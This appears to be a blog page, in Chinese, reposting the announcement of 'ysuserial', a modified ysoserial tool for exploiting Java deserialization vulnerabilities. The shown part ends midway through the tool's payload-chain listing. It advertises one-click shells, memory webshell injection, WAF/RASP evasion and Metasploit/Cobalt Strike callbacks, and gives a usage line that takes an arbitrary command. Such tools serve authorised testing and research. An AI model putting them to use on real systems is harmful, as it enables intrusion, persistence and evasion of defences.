@@ -1,0 +1,966 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="云怡">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="目录导航  项目支持利用链展示：  项目地址:  利用方式  针对 ChainedTransformer 针对 TemplatesImpl 扩展攻击-内存马及回显 任意自定义代码 普通命令执行   URLDNS 探测目标类 其他利用链的拓展 MSF&#x2F;CS 上线   内存马的使用  命令执行及后门类 NeoReg 隧道类 TomcatEcho   防御的绕过  流量层面 RASP 层面">
+<meta property="og:type" content="article">
+<meta property="og:title" content="销骨风月斋">
+<meta property="og:url" content="https://red-fair.github.io/red-fair.github.io/2023/08/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/ysoserial%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/index.html">
+<meta property="og:site_name" content="销骨风月斋">
+<meta property="og:description" content="目录导航  项目支持利用链展示：  项目地址:  利用方式  针对 ChainedTransformer 针对 TemplatesImpl 扩展攻击-内存马及回显 任意自定义代码 普通命令执行   URLDNS 探测目标类 其他利用链的拓展 MSF&#x2F;CS 上线   内存马的使用  命令执行及后门类 NeoReg 隧道类 TomcatEcho   防御的绕过  流量层面 RASP 层面">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/1-71-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/2-58-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/3-49-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/4-45-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/5-42-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/6-38-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/7-35-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/8-34-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/9-34-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/10-32-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/11-25-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/12-24-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/13-24-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/14-21-scaled.webp">
+<meta property="og:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/15-21.webp">
+<meta property="article:published_time" content="2023-08-01T14:17:01.315Z">
+<meta property="article:modified_time" content="2023-08-01T14:19:11.821Z">
+<meta property="article:author" content="云怡">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.ddosi.org/wp-content/uploads/2022/06/1-71-scaled.webp">
+  
+  
+  
+  <title>销骨风月斋</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"red-fair.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":200,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>风月斋</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-01 22:17" pubdate>
+          August 1, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          102 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>目录导航</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E9%A1%B9%E7%9B%AE%E6%94%AF%E6%8C%81%E5%88%A9%E7%94%A8%E9%93%BE%E5%B1%95%E7%A4%BA%EF%BC%9A" title="项目支持利用链展示：">项目支持利用链展示：</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80" title="项目地址:">项目地址:</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F" title="利用方式">利用方式</a></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E9%92%88%E5%AF%B9_ChainedTransformer" title="针对 ChainedTransformer">针对 ChainedTransformer</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E9%92%88%E5%AF%B9_TemplatesImpl" title="针对 TemplatesImpl">针对 TemplatesImpl</a><ul>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB-%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8A%E5%9B%9E%E6%98%BE" title="扩展攻击-内存马及回显">扩展攻击-内存马及回显</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E4%BB%BB%E6%84%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BB%A3%E7%A0%81" title="任意自定义代码">任意自定义代码</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E6%99%AE%E9%80%9A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C" title="普通命令执行">普通命令执行</a></li>
+</ul>
+</li>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#URLDNS_%E6%8E%A2%E6%B5%8B%E7%9B%AE%E6%A0%87%E7%B1%BB" title="URLDNS 探测目标类">URLDNS 探测目标类</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%8B%93%E5%B1%95" title="其他利用链的拓展">其他利用链的拓展</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#MSFCS_%E4%B8%8A%E7%BA%BF" title="MSF/CS 上线">MSF&#x2F;CS 上线</a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%BD%BF%E7%94%A8" title="内存马的使用">内存马的使用</a></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E5%90%8E%E9%97%A8%E7%B1%BB" title="命令执行及后门类">命令执行及后门类</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#NeoReg_%E9%9A%A7%E9%81%93%E7%B1%BB" title="NeoReg 隧道类">NeoReg 隧道类</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#TomcatEcho" title="TomcatEcho">TomcatEcho</a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E9%98%B2%E5%BE%A1%E7%9A%84%E7%BB%95%E8%BF%87" title="防御的绕过">防御的绕过</a></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2" title="流量层面">流量层面</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#RASP_%E5%B1%82%E9%9D%A2" title="RASP 层面">RASP 层面</a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E5%8F%82%E8%80%83" title="参考">参考</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E6%9B%B4%E6%96%B0" title="更新">更新</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E6%8F%90%E9%97%AE%E4%B8%8E%E4%BA%A4%E6%B5%81" title="提问与交流">提问与交流</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E" title="免责声明">免责声明</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D" title="防御与修复">防御与修复</a></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80" title="工具下载地址:">工具下载地址:</a><ul>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E2%91%A0GitHub" title="①GitHub:">①GitHub:</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ddosi.org/ysuserial/#%E2%91%A1%E4%BA%91%E4%B8%AD%E8%BD%AC%E7%BD%91%E7%9B%98" title="②云中转网盘:">②云中转网盘:</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>某行动在即，为助力在一线防守的伙伴，特发此自用项目，帮助伙伴们更高效、更快速的针对 Java 反序列化漏洞进行自检及安全修复。</p>
+<p>本项目为 ysoserial [su18] 专版，取名为 ysuserial ，在原项目 <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a> 基础上魔改而来，主要有以下新添加功能：</p>
+<ol>
+<li>基础链版本的覆盖：原版反序列化链可能仅限于某几个版本，本项目添加了如 CB&#x2F;C3P0 等链的低版本，可一键 getshell 的版本覆盖更广；</li>
+<li>**&#x3D;&#x3D;利用链的扩充和丰富&#x3D;&#x3D;**：在原版基础上添加了多条利用链，扩展利用方式，更够在依赖不确定、利用方式有限制的情况扩展更多的攻击路径；</li>
+<li>利用方式的填充：原版的利用链的利用方式仅使用了 Runtime 执行系统命令，本项目添加了多种利用方式，并支持执行自定义任意代码；</li>
+<li>利用链探测：本项目在 URLDNS 中添加了利用链的探测，在攻击中不再盲目乱打，先通过 DNSLOG 检测类名，再执行攻击；</li>
+<li>内存马：本项目在利用时，对于部分链支持了一键打入 Spring&#x2F;Tomcat 内存马功能，内存马支持命令执行、冰蝎、哥斯拉三种利用方式；并支持 Tomcat 回显命令执行、Neoreg 流量隧道内存马；</li>
+<li>防御绕过：在部分系统中使用了 WAF&#x2F;RASP 等防御模式，本项目去除大多数原版特征，并在执行恶意动作时使用了多种能够绕过 RASP 的执行方式，绕过防护；</li>
+<li>MSF&#x2F;CS 上线：配合远程 Jar 包一键上线 MSF&#x2F;CS 的功能，集成一体，快人一步。</li>
+</ol>
+<h2 id="项目支持利用链展示："><a href="#项目支持利用链展示：" class="headerlink" title="项目支持利用链展示："></a>项目支持利用链展示：</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$ </span>java -jar ysuserial-<span class="hljs-number">0.1</span>-su18-all.jar<br>            _.-^^---....,,--<br>       _--                  --_<br>      &lt;                        &gt;)<br>      |<span class="hljs-params">       Y Su Serial ?     </span>|<br>       \._                   _./<br>          <span class="hljs-string">``</span><span class="hljs-string">`--. . , ; .--&#x27;&#x27;&#x27;</span><br><span class="hljs-string">                | |   |</span><br><span class="hljs-string">             .-=||  | |=-.</span><br><span class="hljs-string">             `</span>-=<span class="hljs-comment">#$%&amp;%$#=-&#x27;</span><br>                |<span class="hljs-params"> ;  :</span>|<br>       _____.,-<span class="hljs-comment">#%&amp;$@%#&amp;#~,._____</span><br>     _____.,[ 暖风熏得游人醉 ],._____<br>     _____.,[ 只把杭州作汴州 ],._____<br>[root]<span class="hljs-comment">#~  A Mind-Blowing Tool Collected By [ su18<span class="hljs-doctag">@javaweb</span>.org ]</span><br>[root]<span class="hljs-comment">#~  Shout Out to Yzmm / Shxjia / Y4er / N1nty / C0ny1 / Phith0n / Kezibei</span><br>[root]<span class="hljs-comment">#~  AND OF COURSE TO THE All MIGHTY <span class="hljs-doctag">@frohoff</span>  </span><br>[root]<span class="hljs-comment">#~  Usage: java -jar ysuserial-0.1-su18-all.jar [payload] &#x27;[command]&#x27;</span><br>[root]<span class="hljs-comment">#~  Available payload types:</span><br><span class="hljs-title class_">Jun</span> <span class="hljs-number">19</span>, <span class="hljs-number">2022</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">54</span><span class="hljs-symbol">:</span><span class="hljs-number">53</span> <span class="hljs-variable constant_">PM</span> org.reflections.<span class="hljs-title class_">Reflections</span> scan<br><span class="hljs-variable constant_">INFO</span>: <span class="hljs-title class_">Reflections</span> took <span class="hljs-number">195</span> ms to scan <span class="hljs-number">1</span> urls, producing <span class="hljs-number">26</span> keys <span class="hljs-keyword">and</span> <span class="hljs-number">230</span> values <br>     <span class="hljs-title class_">Payload</span>                  <span class="hljs-title class_">Authors</span>                                <span class="hljs-title class_">Dependencies</span>                                                                                                                                                                                        <br>     -------                  -------                                ------------                                                                                                                                                                                        <br>     <span class="hljs-title class_">AspectJWeaver</span>            <span class="hljs-variable">@Jang</span>                                  <span class="hljs-symbol">aspectjweaver:</span><span class="hljs-number">1.9</span>.<span class="hljs-number">2</span>, commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.2</span>.<span class="hljs-number">2</span>                                                                                                                                                      <br>     <span class="hljs-title class_">BeanShell1</span>               <span class="hljs-variable">@pwntester</span>, <span class="hljs-variable">@cschneider4711</span>            <span class="hljs-symbol">bsh:</span><span class="hljs-number">2</span>.0b5                                                                                                                                                                                           <br>     <span class="hljs-variable constant_">C3P0</span>                     <span class="hljs-variable">@mbechler</span>                              <span class="hljs-symbol">c3p0:</span><span class="hljs-number">0.9</span>.<span class="hljs-number">5.2</span>, mchange-commons-<span class="hljs-symbol">java:</span><span class="hljs-number">0.2</span>.<span class="hljs-number">11</span>                                                                                                                                                           <br>     <span class="hljs-variable constant_">C3P092</span>                   <span class="hljs-variable">@mbechler</span>                              <span class="hljs-symbol">c3p0:</span><span class="hljs-number">0.9</span>.<span class="hljs-number">2</span>-pre2-<span class="hljs-variable constant_">RELEASE</span> ~ <span class="hljs-number">0.9</span>.<span class="hljs-number">5</span>-pre8, mchange-commons-<span class="hljs-symbol">java:</span><span class="hljs-number">0.2</span>.<span class="hljs-number">11</span>                                                                                                                                   <br>     <span class="hljs-title class_">Click1</span>                   <span class="hljs-variable">@artsploit</span>                             click-<span class="hljs-symbol">nodeps:</span><span class="hljs-number">2.3</span>.<span class="hljs-number">0</span>, javax.servlet-<span class="hljs-symbol">api:</span><span class="hljs-number">3.1</span>.<span class="hljs-number">0</span>                                                                                                                                                         <br>     <span class="hljs-title class_">Clojure</span>                  <span class="hljs-variable">@JackOfMostTrades</span>                      <span class="hljs-symbol">clojure:</span><span class="hljs-number">1.8</span>.<span class="hljs-number">0</span>                                                                                                                                                                                       <br>     <span class="hljs-title class_">CommonsBeanutils1</span>        <span class="hljs-variable">@frohoff</span>                               commons-<span class="hljs-symbol">beanutils:</span><span class="hljs-number">1.9</span>.<span class="hljs-number">2</span>, commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.1</span>, commons-<span class="hljs-symbol">logging:</span><span class="hljs-number">1.2</span>                                                                                                                               <br>     <span class="hljs-title class_">CommonsBeanutils1183</span>NOCC                                        commons-<span class="hljs-symbol">beanutils:</span><span class="hljs-number">1.8</span>.<span class="hljs-number">3</span>                                                                                                                                                                             <br>     <span class="hljs-title class_">CommonsBeanutils2</span>                                               commons-<span class="hljs-symbol">beanutils:</span><span class="hljs-number">1.9</span>.<span class="hljs-number">2</span>                                                                                                                                                                             <br>     <span class="hljs-title class_">CommonsBeanutils2</span>NOCC                                           commons-<span class="hljs-symbol">beanutils:</span><span class="hljs-number">1.8</span>.<span class="hljs-number">3</span>, commons-<span class="hljs-symbol">logging:</span><span class="hljs-number">1.2</span>                                                                                                                                                        <br>     <span class="hljs-title class_">CommonsBeanutils3</span>                                               commons-<span class="hljs-symbol">beanutils:</span><span class="hljs-number">1.9</span>.<span class="hljs-number">2</span>, commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.1</span>                                                                                                                                                    <br>     <span class="hljs-title class_">CommonsBeanutils3183</span>                                            commons-<span class="hljs-symbol">beanutils:</span><span class="hljs-number">1.9</span>.<span class="hljs-number">2</span>, commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.1</span>, commons-<span class="hljs-symbol">logging:</span><span class="hljs-number">1.2</span>                                                                                                                               <br>     <span class="hljs-title class_">CommonsCollections1</span>      <span class="hljs-variable">@frohoff</span>                               commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.1</span>                                                                                                                                                                             <br>     <span class="hljs-title class_">CommonsCollections2</span>      <span class="hljs-variable">@frohoff</span>                               commons-<span class="hljs-symbol">collections4:</span><span class="hljs-number">4.0</span>                                                                                                                                                                            <br>     <span class="hljs-title class_">CommonsCollections3</span>      <span class="hljs-variable">@frohoff</span>                               commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.1</span>                                                                                                                                                                             <br>     <span class="hljs-title class_">CommonsCollections4</span>      <span class="hljs-variable">@frohoff</span>                               commons-<span class="hljs-symbol">collections4:</span><span class="hljs-number">4.0</span>                                                                                                                                                                            <br>     <span class="hljs-title class_">CommonsCollections5</span>      <span class="hljs-variable">@matthias_kaiser</span>, <span class="hljs-variable">@jasinner</span>            commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.1</span>                                                                                                                                                                             <br>     <span class="hljs-title class_">CommonsCollections6</span>      <span class="hljs-variable">@matthias_kaiser</span>                       commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.1</span>                                                                                                                                                                             <br>     <span class="hljs-title class_">CommonsCollections6Lite</span>  <span class="hljs-variable">@matthias_kaiser</span>                       commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.1</span>                                                                                                                                                                             <br>     <span class="hljs-title class_">CommonsCollections7</span>      <span class="hljs-variable">@scristalli</span>, <span class="hljs-variable">@hanyrax</span>, <span class="hljs-variable">@EdoardoVignati</span> commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.1</span>                                                                                                                                                                             <br>     <span class="hljs-title class_">CommonsCollections8</span>      <span class="hljs-variable">@navalorenzo</span>                           commons-<span class="hljs-symbol">collections4:</span><span class="hljs-number">4.0</span>                                                                                                                                                                            <br>     <span class="hljs-title class_">CommonsCollections9</span>                                             commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.2</span>.<span class="hljs-number">1</span>                                                                                                                                                                           <br>     <span class="hljs-title class_">FileUpload1</span>              <span class="hljs-variable">@mbechler</span>                              commons-<span class="hljs-symbol">fileupload:</span><span class="hljs-number">1.3</span>.<span class="hljs-number">1</span>, commons-<span class="hljs-symbol">io:</span><span class="hljs-number">2.4</span>                                                                                                                                                            <br>     <span class="hljs-title class_">Groovy1</span>                  <span class="hljs-variable">@frohoff</span>                               <span class="hljs-symbol">groovy:</span><span class="hljs-number">2.3</span>.<span class="hljs-number">9</span>                                                                                                                                                                                        <br>     <span class="hljs-title class_">Hibernate1</span>               <span class="hljs-variable">@mbechler</span>                                                                                                                                                                                                                                  <br>     <span class="hljs-title class_">Hibernate2</span>               <span class="hljs-variable">@mbechler</span>                                                                                                                                                                                                                                  <br>     <span class="hljs-title class_">JBossInterceptors1</span>       <span class="hljs-variable">@matthias_kaiser</span>                       <span class="hljs-symbol">javassist:</span><span class="hljs-number">3.12</span>.<span class="hljs-number">1</span>.<span class="hljs-variable constant_">GA</span>, jboss-interceptor-<span class="hljs-symbol">core:</span><span class="hljs-number">2.0</span>.<span class="hljs-number">0</span>.<span class="hljs-title class_">Final</span>, cdi-<span class="hljs-symbol">api:</span><span class="hljs-number">1.0</span>-<span class="hljs-variable constant_">SP1</span>, javax.interceptor-<span class="hljs-symbol">api:</span><span class="hljs-number">3.1</span>, jboss-interceptor-<span class="hljs-symbol">spi:</span><span class="hljs-number">2.0</span>.<span class="hljs-number">0</span>.<span class="hljs-title class_">Final</span>, slf4j-<span class="hljs-symbol">api:</span><span class="hljs-number">1.7</span>.<span class="hljs-number">21</span>                                            <br>     <span class="hljs-title class_">JRE8u20</span>                  <span class="hljs-variable">@frohoff</span>                                                                                                                                                                                                                                   <br>     <span class="hljs-title class_">JRMPClient</span>               <span class="hljs-variable">@mbechler</span>                                                                                                                                                                                                                                  <br>     <span class="hljs-title class_">JRMPClient</span>_Activator     <span class="hljs-variable">@mbechler</span>                                                                                                                                                                                                                                  <br>     <span class="hljs-title class_">JRMPClient</span>_Obj           <span class="hljs-variable">@mbechler</span>                                                                                                                                                                                                                                  <br>     <span class="hljs-title class_">JRMPListener</span>             <span class="hljs-variable">@mbechler</span>                                                                                                                                                                                                                                  <br>     <span class="hljs-variable constant_">JSON1</span>                    <span class="hljs-variable">@mbechler</span>                              json-<span class="hljs-symbol">lib:</span><span class="hljs-symbol">jar:</span><span class="hljs-symbol">jdk15:</span><span class="hljs-number">2.4</span>, spring-<span class="hljs-symbol">aop:</span><span class="hljs-number">4.1</span>.<span class="hljs-number">4</span>.<span class="hljs-variable constant_">RELEASE</span>, <span class="hljs-symbol">aopalliance:</span><span class="hljs-number">1.0</span>, commons-<span class="hljs-symbol">logging:</span><span class="hljs-number">1.2</span>, commons-<span class="hljs-symbol">lang:</span><span class="hljs-number">2.6</span>, <span class="hljs-symbol">ezmorph:</span><span class="hljs-number">1.0</span>.<span class="hljs-number">6</span>, commons-<span class="hljs-symbol">beanutils:</span><span class="hljs-number">1.9</span>.<span class="hljs-number">2</span>, spring-<span class="hljs-symbol">core:</span><span class="hljs-number">4.1</span>.<span class="hljs-number">4</span>.<span class="hljs-variable constant_">RELEASE</span>, commons-<span class="hljs-symbol">collections:</span><span class="hljs-number">3.1</span><br>     